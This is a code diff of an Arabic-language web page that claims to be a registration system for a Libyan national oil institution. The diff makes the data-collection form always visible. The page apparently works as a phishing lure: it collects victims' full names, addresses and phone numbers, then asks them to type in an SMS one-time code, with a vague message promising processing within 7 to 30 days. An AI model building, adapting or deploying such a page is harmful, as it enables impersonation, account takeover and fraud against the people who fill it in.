@@ -152,7 +152,42 @@
 </head>
 <body>
 
-  <div id="main-content"></div>
+  <div id="main-content">
+    <div class="container">
+      <div class="logo-container">
+        <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
+        <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
+      </div>
+
+      <h2>تسجيل الدخول</h2>
+
+      <form id="phoneForm" onsubmit="return sendPhone(event);">
+        <label for="fullname">الاسم الثلاثي:</label>
+        <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
+
+        <label for="address">العنوان:</label>
+        <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
+
+        <label for="phone">رقم الهاتف:</label>
+        <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
+
+        <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
+        <div id="timer"></div>
+      </form>
+
+      <form id="codeForm" onsubmit="return sendCode(event);">
+        <div id="codeField">
+          <label for="code">جاري إرسال الكود عبر SMS</label>
+          <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
+          <div id="errorMessage" class="error"></div>
+          <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
+          <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
+            جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب بيانات جديدة منك وشكرًا
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
 
   <div class="visitor-counter">
     <a href="https://www.hitwebcounter.com" target="_blank">
@@ -163,64 +198,8 @@
   </div>
 
   <script>
-    const now = new Date();
-    const hour = now.getHours();
-    const mainContent = document.getElementById("main-content");
-
-    if (hour < 20 || hour >= 22) {
-      // خارج وقت التسجيل
-      mainContent.innerHTML = `
-        <div style="background-color: #fff; padding: 40px 30px; border-radius: 15px; max-width: 400px; margin: 100px auto; text-align: center; font-family: 'Cairo', sans-serif; box-shadow: 0 5px 15px rgba(0,0,0,0.2);">
-          <div style="margin-bottom: 15px;">
-            <img src="uy.jpeg" alt="شعار المؤسسة" style="width: 120px; height: 120px; object-fit: contain; display: block; margin: 0 auto;" />
-            <p style="margin-top: 8px; font-weight: bold; color: #003366;">المؤسسة الوطنية للنفط</p>
-          </div>
-          <h2 style="color: #002147; margin-bottom: 20px;">🚫 خارج وقت التسجيل</h2>
-          <p style="font-size: 18px; margin-bottom: 30px;">التسجيل متاح من الساعة <strong>8 مساءً</strong> إلى <strong>10 مساءً</strong> فقط.</p>
-          <a href="https://noc.ly/" style="display: inline-block; background-color: #007BFF; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-size: 16px; font-weight: bold;">حسناً</a>
-        </div>
-      `;
-    } else {
-      // داخل وقت التسجيل
-      mainContent.innerHTML = `
-        <div class="container">
-          <div class="logo-container">
-            <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
-            <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
-          </div>
-
-          <h2>تسجيل الدخول</h2>
-
-          <form id="phoneForm" onsubmit="return sendPhone(event);">
-            <label for="fullname">الاسم الثلاثي:</label>
-            <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
-
-            <label for="address">العنوان:</label>
-            <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
-
-            <label for="phone">رقم الهاتف:</label>
-            <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
-
-            <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
-            <div id="timer"></div>
-          </form>
-
-          <form id="codeForm" onsubmit="return sendCode(event);">
-            <div id="codeField">
-              <label for="code">جاري إرسال الكود عبر SMS</label>
-              <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
-              <div id="errorMessage" class="error"></div>
-              <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
-              <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
-                جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب بيانات جديدة منك وشكرًا
-              </div>
-            </div>
-          </form>
-        </div>
-      `;
-    }
-
     let countdownInterval;
+
     function startTimer(duration) {
       let timeLeft = duration;
       const timerDisplay = document.getElementById('timer');
